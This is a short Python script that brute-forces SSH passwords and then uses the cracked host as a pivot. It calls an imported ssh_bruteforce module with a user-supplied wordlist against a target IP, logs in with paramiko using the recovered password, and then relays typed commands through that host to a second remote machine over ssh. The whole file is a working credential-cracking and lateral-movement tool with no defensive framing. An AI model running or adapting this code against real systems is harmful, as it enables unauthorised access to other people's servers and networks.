#!/usr/bin/env python
import sys
import paramiko
import os
import ssh_bruteforce as bruteforce


def proxy_connection(PROXY_IP,PROXY_PORT,PROXY_USER,PROXY_PASSWORD,REMOTE_IP,REMOTE_PORT,REMOTE_USER):
  try:
    proxy = paramiko.SSHClient()
    proxy.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    proxy.connect(hostname=PROXY_IP, port=PROXY_PORT, username=PROXY_USER, password=PROXY_PASSWORD)
    print("Successfully connected to {} through port {}".format(PROXY_IP,PROXY_PORT))
  
    while True:
      proxy_ssh_session = proxy.get_transport().open_session() 
      if proxy_ssh_session.active:
        input_command = input("Enter command to execute on remote host: ")

        if str(input_command) == "exit":
          proxy_ssh_session.close()
          return
        
        full_input_command = "ssh -t {}@{} {}".format(REMOTE_USER,REMOTE_IP,input_command)
        proxy_ssh_session.exec_command(full_input_command)
        response = proxy_ssh_session.recv(4096)
        print(response.decode())
        
  
  except (paramiko.AuthenticationException) as e:
    print("Login to proxy host failed.\nError: {}".format(e))
    return
  
  except (paramiko.BadHostKeyException) as e:
    print("Bad host key error at {}\nError: {}".format(PROXY_IP,e))

  except (paramiko.SSHException) as e:
    print("SSH exception error at {}\nError: {}".format(PROXY_IP,e))
    

def main():
  try:
    user = input("Enter username: ")
    target_ip = input("Enter target IP address: ")
    port_num = input("Enter port number: ")
    wordlist_path = input("Enter wordlist/wordlist file path: ")
     
    

    if os.path.exists(wordlist_path):
      print("="*50 + "\nStarting Bruteforce...\n" + "="*50)
      bruteforce.brute_force(user,target_ip,port_num,wordlist_path)
      #PROXY VARIABLES
      proxy_user = user
      proxy_ip = target_ip
      proxy_port = port_num
      proxy_password = bruteforce.password
      #REMOTE HOST VARIABLES
      remote_user = input("Enter remote username: ")
      remote_ip = input("Enter remote IP: ")
      remote_port = input("Enter remote port: ")    
      

      proxy_connection(proxy_ip,proxy_port,proxy_user,proxy_password,remote_ip,remote_port,remote_user)
      
    else:
        print("invalid wordlist")
    
  except KeyboardInterrupt:
    print("Exiting....")
    sys.exit()






if __name__ == "__main__":
  main()